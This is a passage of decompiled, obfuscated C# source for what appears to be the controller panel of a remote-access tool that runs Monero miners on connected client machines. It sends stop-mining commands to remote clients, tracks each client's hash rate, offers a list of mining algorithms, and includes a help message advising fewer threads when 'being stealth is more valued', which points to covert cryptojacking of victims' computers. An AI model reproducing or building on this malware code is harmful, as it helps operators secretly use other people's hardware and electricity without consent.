        while (enumerator.MoveNext())
        {
            cMinerXMRcli current = (cMinerXMRcli) enumerator.Current;
            if (!current.rejected)
            {
                num += Conversion.Val(current.SPEED);
                continue;
            }
            num2 += Conversion.Val(current.SPEED);
            num3 += 1L;
        }
        if (num2 <= 0.0)
        {
            this.vmethod_2().Text = "Miners: " + Conversions.ToString(this.vmethod_22().get_Items().Count);
            this.vmethod_4().Text = "Speed: " + Conversions.ToString(num) + " H/s";
        }
        else
        {
            string[] textArray1 = new string[] { "Miners: ", Conversions.ToString(this.vmethod_22().get_Items().Count), " (", Conversions.ToString(num3), " inactive)" };
            this.vmethod_2().Text = string.Concat(textArray1);
            string[] textArray2 = new string[] { "Speed: ", Conversions.ToString(num), " H/s (", Conversions.ToString(num2), " H/s rejected speed)" };
            this.vmethod_4().Text = string.Concat(textArray2);
        }
        this.vmethod_24().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().get_SelectedObjects().Count);
    }

    private void method_30(object sender, EventArgs e)
    {
        string str;
        string sKey;
        Class136.Class138 class2;
        FastObjectListView view = Class130.fMain_0.vmethod_18();
        if (!this.vmethod_30().Checked)
        {
            IEnumerator enumerator = view.get_Objects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                str = "xmr_mine_stop|1";
                sKey = ((CClient) enumerator.Current).sKey;
                class2 = new Class136.Class138();
                class2.string_0 = sKey;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        else if (view.get_SelectedObjects() != null)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                str = "xmr_mine_stop|1";
                sKey = ((CClient) enumerator.Current).sKey;
                class2 = new Class136.Class138();
                class2.string_0 = sKey;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        view = null;
    }

    private void method_31(object sender, EventArgs e)
    {
        Interaction.MsgBox("It's recommended to leave the number of threads to auto, especially when mining from several clients with different PC specifications.\r\nIf auto is selected, the miner will use as many threads as possible for optimal mining performance and typically consume about 50% of CPU power in average.\r\nBy setting a value for threads, like 16, will consume about 100% from CPUs having 8 cores and cause stuttering/lag on waker CPUs.\r\nIf being stealth is more valued, then it's recommended to use a low number for threads at the cost of reduced hash rate.\r\nI.e. 2-4 threads may be prefered and should consume between 25-50% of CPU power.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_32(object sender, EventArgs e)
    {
    }

    private void method_33(object sender, EventArgs e)
    {
    }

    private void method_34(object sender, EventArgs e)
    {
    }

    private void method_35(object sender, EventArgs e)
    {
    }

    private void method_36(object sender, EventArgs e)
    {
    }

    private void method_37(object sender, EventArgs e)
    {
        this.vmethod_36().BringToFront();
        this.vmethod_36().Width = (base.Width - this.vmethod_36().Left) - 0x23;
        this.vmethod_36().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        if (Operators.CompareString(this.vmethod_36().Text, "Username/wallet address", true) == 0)
        {
            this.vmethod_36().Text = string.Empty;
            this.vmethod_36().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_36().Font, FontStyle.Regular);
            this.vmethod_36().Font = font;
        }
    }

    private void method_38(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_36().Text, string.Empty, true) == 0)
        {
            this.vmethod_36().Text = "Username/wallet address";
            this.vmethod_36().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_36().Font, FontStyle.Italic);
            this.vmethod_36().Font = font;
        }
        this.vmethod_36().Width = this.vmethod_34().Width;
        this.vmethod_36().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
    }

    public void method_4()
    {
        base.Width = 0x47e;
        base.Height = 550;
        this.vmethod_22().VirtualMode = true;
        this.vmethod_22().set_View(View.Details);
        this.vmethod_22().FullRowSelect = true;
        this.vmethod_22().set_OwnerDraw(true);
        this.vmethod_22().get_Columns()[0].Width = 160;
        this.vmethod_22().get_Columns()[1].Width = 80;
        this.vmethod_22().get_Columns()[2].Width = 160;
        this.vmethod_22().get_Columns()[3].Width = 80;
        this.vmethod_22().get_Columns()[4].Width = 80;
        this.vmethod_22().get_Columns()[5].Width = 160;
        this.vmethod_22().get_Columns()[6].Width = 80;
        this.vmethod_22().get_Columns()[7].Width = 80;
        this.vmethod_22().get_Columns()[8].Width = 100;
        this.vmethod_22().get_Columns()[9].Width = 120;
        this.vmethod_22().GridLines = Class135.smethod_0().Gridlines;
        this.vmethod_42().Items.Add("cn/r");
        this.vmethod_42().Items.Add("rx/0");
        this.vmethod_42().Items.Add("argon2/chukwa");
        this.vmethod_42().Items.Add("argon2/wrkz");
        this.vmethod_42().Items.Add("rx/wow");
        this.vmethod_42().Items.Add("rx/loki");
        this.vmethod_42().Items.Add("cn/fast");
        this.vmethod_42().Items.Add("cn/rwz");
        this.vmethod_42().Items.Add("cn/zls");
        this.vmethod_42().Items.Add("cn/double");
        this.vmethod_42().Items.Add("cn/wow");
        this.vmethod_42().Items.Add("cn/gpu");
        this.vmethod_42().Items.Add("cn-pico");
        this.vmethod_42().Items.Add("cn/half");
        this.vmethod_42().Items.Add("cn/2");
        this.vmethod_42().Items.Add("cn/xao");
        this.vmethod_42().Items.Add("cn/rto");
        this.vmethod_42().Items.Add("cn-heavy/tube");
        this.vmethod_42().Items.Add("cn-heavy/xhv");
        this.vmethod_42().Items.Add("cn-heavy/0");
        this.vmethod_42().Items.Add("cn/1");
        this.vmethod_42().Items.Add("cn-lite/1");
        this.vmethod_42().Items.Add("cn-lite/0");
        this.vmethod_42().Items.Add("cn/0");
        this.vmethod_42().SelectedItem = this.vmethod_42().Items[0];
        this.vmethod_44().Items.Add("Auto");
        int item = 1;
        while (true)
        {
            this.vmethod_44().Items.Add(item);
            item++;
            if (item > 0x80)
            {
                this.vmethod_44().SelectedItem = this.vmethod_44().Items[0];
                this.vmethod_56().Items.Add("Default");
                int num2 = 1;
                while (true)
                {
                    this.vmethod_56().Items.Add(num2);
                    num2++;
                    if (num2 > 0x63)
                    {
                        this.vmethod_56().SelectedItem = this.vmethod_56().Items[0];
                        this.vmethod_62().Items.Add("Realtime");
                        this.vmethod_62().Items.Add("High");
                        this.vmethod_62().Items.Add("Above normal");
                        this.vmethod_62().Items.Add("Normal");
                        this.vmethod_62().Items.Add("Below normal");
                        this.vmethod_62().Items.Add("Low");
                        this.vmethod_62().SelectedItem = this.vmethod_62().Items[3];
                        this.vmethod_108().RunWorkerAsync();
                        return;
                    }
                }
            }
        }
    }

    private void method_5(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_34().Text, "example-pool.com:5555", true) == 0)
        {
            this.vmethod_34().Text = string.Empty;
            this.vmethod_34().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_34().Font, FontStyle.Regular);
            this.vmethod_34().Font = font;
        }
    }

    private void method_6(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_34().Text, string.Empty, true) == 0)
        {
            this.vmethod_34().Text = "example-pool.com:5555";
            this.vmethod_34().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_34().Font, FontStyle.Italic);
            this.vmethod_34().Font = font;
        }
    }

    private void method_7(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_52().Text, string.Empty, true) == 0)
        {
            this.vmethod_52().Text = "(Optional)";
            this.vmethod_52().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_52().Font, FontStyle.Italic);
            this.vmethod_52().Font = font;
        }
    }

    private void method_8(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_52().Text, "(Optional)", true) == 0)
        {
            this.vmethod_52().Text = string.Empty;
            this.vmethod_52().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_52().Font, FontStyle.Regular);
            this.vmethod_52().Font = font;
        }
    }

    private void method_9(object sender, FormatRowEventArgs e)
    {
        cMinerXMRcli rcli = (cMinerXMRcli) e.get_Model();
        if (rcli.bJustConnected)
        {
            e.get_Item().BackColor = Color.LimeGreen;
        }
        else if (!rcli.pending_dc & !rcli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.White;
        }
        else if (rcli.pending_dc & rcli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.Yellow;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
        else if (rcli.pending_dc & !rcli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.Red;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
        if (rcli.rejected)
        {
            e.get_Item().BackColor = Color.LightGray;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
    }

    internal virtual StatusStrip vmethod_0()
    {
        return this.statusStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(StatusStrip statusStrip_1)
    {
        this.statusStrip_0 = statusStrip_1;
    }

    internal virtual OLVColumn vmethod_10()
    {
        return this.olvcolumn_2;
    }

    internal virtual ToolStripSeparator vmethod_100()
    {
        return this.toolStripSeparator_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_101(ToolStripSeparator toolStripSeparator_4)
    {
        this.toolStripSeparator_3 = toolStripSeparator_4;
    }

    internal virtual ToolStripMenuItem vmethod_102()
    {
        return this.toolStripMenuItem_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_103(ToolStripMenuItem toolStripMenuItem_8)
    {
        EventHandler handler = new EventHandler(this.method_23);
        ToolStripMenuItem item = this.toolStripMenuItem_7;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_7 = toolStripMenuItem_8;
        item = this.toolStripMenuItem_7;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_104()
    {
        return this.checkBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_105(CheckBox checkBox_4)
    {
        this.checkBox_3 = checkBox_4;
    }

    internal virtual PictureBox vmethod_106()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_107(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_24);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_2;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual BackgroundWorker vmethod_108()
    {
        return this.backgroundWorker_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_109(BackgroundWorker backgroundWorker_1)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_28);
        BackgroundWorker worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_0 = backgroundWorker_1;
        worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_2 = olvcolumn_10;
    }

    internal virtual VisualButton vmethod_110()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_111(VisualButton visualButton_2)
    {
        EventHandler handler = new EventHandler(this.method_30);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_2;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_112()
    {
        return this.visualButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_113(VisualButton visualButton_2)
    {
        EventHandler handler = new EventHandler(this.method_29);
        VisualButton button = this.visualButton_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_1 = visualButton_2;
        button = this.visualButton_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_114()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_115(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_31);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_1 = pictureBox_2;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual OLVColumn vmethod_12()
    {
        return this.olvcolumn_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_3 = olvcolumn_10;
    }

    internal virtual OLVColumn vmethod_14()
    {
        return this.olvcolumn_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_4 = olvcolumn_10;
    }

    internal virtual OLVColumn vmethod_16()
    {
        return this.olvcolumn_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_5 = olvcolumn_10;
    }

    internal virtual OLVColumn vmethod_18()
    {
        return this.olvcolumn_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_6 = olvcolumn_10;
    }

    internal virtual ToolStripStatusLabel vmethod_2()
    {
        return this.toolStripStatusLabel_0;
    }

    internal virtual OLVColumn vmethod_20()
    {
        return this.olvcolumn_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_7 = olvcolumn_10;
    }

    internal virtual FastObjectListView vmethod_22()
    {
        return this.fastObjectListView_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(FastObjectListView fastObjectListView_1)
    {
        EventHandler<FormatRowEventArgs> handler = new EventHandler<FormatRowEventArgs>(this.method_9);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_17);
        KeyEventHandler handler3 = new KeyEventHandler(this.method_21);
        FastObjectListView view = this.fastObjectListView_0;
        if (view != null)
        {
            view.remove_FormatRow(handler);
            view.MouseUp -= handler2;
            view.KeyDown -= handler3;
        }
        this.fastObjectListView_0 = fastObjectListView_1;
        view = this.fastObjectListView_0;
        if (view != null)
        {
            view.add_FormatRow(handler);
            view.MouseUp += handler2;
            view.KeyDown += handler3;
        }
    }

    internal virtual ToolStripStatusLabel vmethod_24()
    {
        return this.toolStripStatusLabel_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(ToolStripStatusLabel toolStripStatusLabel_3)
    {
        this.toolStripStatusLabel_2 = toolStripStatusLabel_3;
    }

    internal virtual Timer vmethod_26()
    {
        return this.timer_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(Timer timer_1)
    {
        EventHandler handler = new EventHandler(this.method_3);
        Timer timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_0 = timer_1;
        timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual RadioButton vmethod_28()
    {
        return this.radioButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(RadioButton radioButton_2)
    {
        this.radioButton_0 = radioButton_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(ToolStripStatusLabel toolStripStatusLabel_3)
    {
        this.toolStripStatusLabel_0 = toolStripStatusLabel_3;
    }

    internal virtual RadioButton vmethod_30()
    {
        return this.radioButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(RadioButton radioButton_2)
    {
        this.radioButton_1 = radioButton_2;
    }

    internal virtual Label vmethod_32()
    {
        return this.label_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(Label label_9)
    {
        this.label_0 = label_9;
    }

    internal virtual TextBox vmethod_34()
    {
        return this.textBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(TextBox textBox_5)
    {
        EventHandler handler = new EventHandler(this.method_5);
        EventHandler handler2 = new EventHandler(this.method_6);
        EventHandler handler3 = new EventHandler(this.method_32);
        TextBox box = this.textBox_0;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
            box.TextChanged -= handler3;
        }
        this.textBox_0 = textBox_5;
        box = this.textBox_0;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
            box.TextChanged += handler3;
        }
    }

    internal virtual TextBox vmethod_36()
    {
        return this.textBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(TextBox textBox_5)
    {
        EventHandler handler = new EventHandler(this.method_33);
        EventHandler handler2 = new EventHandler(this.method_37);
        EventHandler handler3 = new EventHandler(this.method_38);
        TextBox box = this.textBox_1;
        if (box != null)
        {
            box.TextChanged -= handler;
            box.GotFocus -= handler2;
            box.LostFocus -= handler3;
        }
        this.textBox_1 = textBox_5;
        box = this.textBox_1;
        if (box != null)
        {
            box.TextChanged += handler;
            box.GotFocus += handler2;
            box.LostFocus += handler3;
        }
    }

    internal virtual Label vmethod_38()
    {
        return this.label_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(Label label_9)
    {
        this.label_1 = label_9;
    }

    internal virtual ToolStripStatusLabel vmethod_4()
    {
        return this.toolStripStatusLabel_1;
    }

    internal virtual Label vmethod_40()
    {
        return this.label_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(Label label_9)
    {
        this.label_2 = label_9;
    }

    internal virtual ComboBox vmethod_42()
    {
        return this.comboBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(ComboBox comboBox_4)
    {
        this.comboBox_0 = comboBox_4;
    }

    internal virtual ComboBox vmethod_44()
    {
        return this.comboBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(ComboBox comboBox_4)
    {
        this.comboBox_1 = comboBox_4;
    }

    internal virtual Label vmethod_46()
    {
        return this.label_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(Label label_9)
    {
        this.label_3 = label_9;
    }

    internal virtual OLVColumn vmethod_48()
    {
        return this.olvcolumn_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_8 = olvcolumn_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(ToolStripStatusLabel toolStripStatusLabel_3)
    {
        this.toolStripStatusLabel_1 = toolStripStatusLabel_3;
    }

    internal virtual CheckBox vmethod_50()
    {
        return this.checkBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(CheckBox checkBox_4)
    {
        this.checkBox_0 = checkBox_4;
    }

    internal virtual TextBox vmethod_52()
    {
        return this.textBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(TextBox textBox_5)
    {
        EventHandler handler = new EventHandler(this.method_7);
        EventHandler handler2 = new EventHandler(this.method_8);
        EventHandler handler3 = new EventHandler(this.method_34);
        TextBox box = this.textBox_2;
        if (box != null)
        {
            box.LostFocus -= handler;
            box.GotFocus -= handler2;
            box.TextChanged -= handler3;
        }
        this.textBox_2 = textBox_5;
        box = this.textBox_2;
        if (box != null)
        {
            box.LostFocus += handler;
            box.GotFocus += handler2;
            box.TextChanged += handler3;
        }
    }

    internal virtual Label vmethod_54()
    {
        return this.label_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(Label label_9)
    {
        this.label_4 = label_9;
    }

    internal virtual ComboBox vmethod_56()
    {
        return this.comboBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(ComboBox comboBox_4)
    {
        this.comboBox_2 = comboBox_4;
    }

    internal virtual Label vmethod_58()
    {
        return this.label_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(Label label_9)
    {
        this.label_5 = label_9;
    }

    internal virtual OLVColumn vmethod_6()
    {
        return this.olvcolumn_0;
    }

    internal virtual CheckBox vmethod_60()
    {
        return this.checkBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(CheckBox checkBox_4)
    {
        this.checkBox_1 = checkBox_4;
    }

    internal virtual ComboBox vmethod_62()
    {
        return this.comboBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(ComboBox comboBox_4)
    {
        this.comboBox_3 = comboBox_4;
    }

    internal virtual Label vmethod_64()
    {
        return this.label_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_65(Label label_9)
    {
        this.label_6 = label_9;
    }

    internal virtual TextBox vmethod_66()
    {
        return this.textBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_67(TextBox textBox_5)
    {
        EventHandler handler = new EventHandler(this.method_10);
        EventHandler handler2 = new EventHandler(this.method_11);
        EventHandler handler3 = new EventHandler(this.method_36);
        TextBox box = this.textBox_3;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
            box.TextChanged -= handler3;
        }
        this.textBox_3 = textBox_5;
        box = this.textBox_3;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
            box.TextChanged += handler3;
        }
    }

    internal virtual Label vmethod_68()
    {
        return this.label_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_69(Label label_9)
    {
        this.label_7 = label_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_0 = olvcolumn_10;
    }

    internal virtual CheckBox vmethod_70()
    {
        return this.checkBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_71(CheckBox checkBox_4)
    {
        this.checkBox_2 = checkBox_4;
    }

    internal virtual TextBox vmethod_72()
    {
        return this.textBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_73(TextBox textBox_5)
    {
        EventHandler handler = new EventHandler(this.method_12);
        EventHandler handler2 = new EventHandler(this.method_13);
        EventHandler handler3 = new EventHandler(this.method_35);
        TextBox box = this.textBox_4;
        if (box != null)
        {
            box.LostFocus -= handler;
            box.GotFocus -= handler2;
            box.TextChanged -= handler3;
        }
        this.textBox_4 = textBox_5;
        box = this.textBox_4;
        if (box != null)
        {
            box.LostFocus += handler;
            box.GotFocus += handler2;
            box.TextChanged += handler3;
        }
    }

    internal virtual Label vmethod_74()
    {
        return this.label_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_75(Label label_9)
    {
        this.label_8 = label_9;
    }

    internal virtual OLVColumn vmethod_76()
    {
        return this.olvcolumn_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_77(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_9 = olvcolumn_10;
    }

    internal virtual ContextMenuStrip vmethod_78()
    {
        return this.contextMenuStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_79(ContextMenuStrip contextMenuStrip_1)
    {
        this.contextMenuStrip_0 = contextMenuStrip_1;
    }

    internal virtual OLVColumn vmethod_8()
    {
        return this.olvcolumn_1;
    }

    internal virtual ToolStripMenuItem vmethod_80()
    {
        return this.toolStripMenuItem_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_81(ToolStripMenuItem toolStripMenuItem_8)
    {
        this.toolStripMenuItem_0 = toolStripMenuItem_8;
    }

    internal virtual ToolStripMenuItem vmethod_82()
    {
        return this.toolStripMenuItem_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_83(ToolStripMenuItem toolStripMenuItem_8)
    {
        EventHandler handler = new EventHandler(this.method_16);
        ToolStripMenuItem item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_1 = toolStripMenuItem_8;
        item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_84()
    {
        return this.toolStripSeparator_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_85(ToolStripSeparator toolStripSeparator_4)
    {
        this.toolStripSeparator_0 = toolStripSeparator_4;
    }

    internal virtual ToolStripMenuItem vmethod_86()
    {
        return this.toolStripMenuItem_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_87(ToolStripMenuItem toolStripMenuItem_8)
    {
        EventHandler handler = new EventHandler(this.method_14);
        ToolStripMenuItem item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_2 = toolStripMenuItem_8;
        item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_88()
    {
        return this.toolStripSeparator_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_89(ToolStripSeparator toolStripSeparator_4)
    {
        this.toolStripSeparator_1 = toolStripSeparator_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(OLVColumn olvcolumn_10)
    {
        this.olvcolumn_1 = olvcolumn_10;
    }

    internal virtual ToolStripMenuItem vmethod_90()
    {
        return this.toolStripMenuItem_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_91(ToolStripMenuItem toolStripMenuItem_8)
    {
        this.toolStripMenuItem_3 = toolStripMenuItem_8;
    }

    internal virtual ToolStripMenuItem vmethod_92()
    {
        return this.toolStripMenuItem_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_93(ToolStripMenuItem toolStripMenuItem_8)
    {
        EventHandler handler = new EventHandler(this.method_20);
        ToolStripMenuItem item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_4 = toolStripMenuItem_8;
        item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_94()
    {
        return this.toolStripSeparator_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_95(ToolStripSeparator toolStripSeparator_4)
    {
        this.toolStripSeparator_2 = toolStripSeparator_4;
    }

    internal virtual ToolStripMenuItem vmethod_96()
    {
        return this.toolStripMenuItem_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_97(ToolStripMenuItem toolStripMenuItem_8)
    {
        this.toolStripMenuItem_5 = toolStripMenuItem_8;
    }

    internal virtual ToolStripMenuItem vmethod_98()
    {
        return this.toolStripMenuItem_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_99(ToolStripMenuItem toolStripMenuItem_8)
    {
        EventHandler handler = new EventHandler(this.method_22);
        ToolStripMenuItem item = this.toolStripMenuItem_6;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_6 = toolStripMenuItem_8;
        item = this.toolStripMenuItem_6;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    private delegate void Delegate78(string string_0);

    private delegate void Delegate79();

    private delegate void Delegate80();

    private delegate void Delegate81();

    private delegate void Delegate82();

    private delegate void Delegate83(string string_0, string string_1);

    private delegate void Delegate84(string string_0, string[] string_1);
}

